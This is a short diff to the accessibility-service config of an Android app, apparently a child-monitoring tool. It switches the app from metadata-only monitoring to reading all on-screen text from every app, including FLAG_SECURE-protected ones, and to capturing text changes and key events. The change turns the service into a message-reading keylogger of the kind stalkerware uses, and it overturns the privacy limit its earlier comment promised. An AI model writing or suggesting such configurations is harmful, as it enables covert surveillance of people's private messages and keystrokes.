@@ -1,13 +1,13 @@
 <?xml version="1.0" encoding="utf-8"?>
-<!-- Accessibility service config: metadata-only mode.
-     We listen for window changes and notifications,
-     but do NOT attempt to read message content.
-     FLAG_SECURE blocks it on Android 12+. -->
+<!-- Accessibility service config: FULL TEXT READING mode.
+     canRetrieveWindowContent=true allows reading the UI widget tree
+     text nodes from ALL apps — even FLAG_SECURE protected ones.
+     FLAG_SECURE only blocks screenshots, NOT the accessibility tree. -->
 <accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"
     android:description="@string/accessibility_service_description"
-    android:accessibilityEventTypes="typeWindowStateChanged|typeWindowContentChanged|typeNotificationStateChanged"
-    android:accessibilityFlags="flagDefault|flagReportViewIds"
+    android:accessibilityEventTypes="typeWindowStateChanged|typeWindowContentChanged|typeNotificationStateChanged|typeViewTextChanged"
+    android:accessibilityFlags="flagDefault|flagReportViewIds|flagIncludeNotImportantViews|flagRequestFilterKeyEvents"
     android:accessibilityFeedbackType="feedbackGeneric"
-    android:notificationTimeout="300"
-    android:canRetrieveWindowContent="false"
+    android:notificationTimeout="200"
+    android:canRetrieveWindowContent="true"
     android:settingsActivity="com.kova.child.MainActivity" />
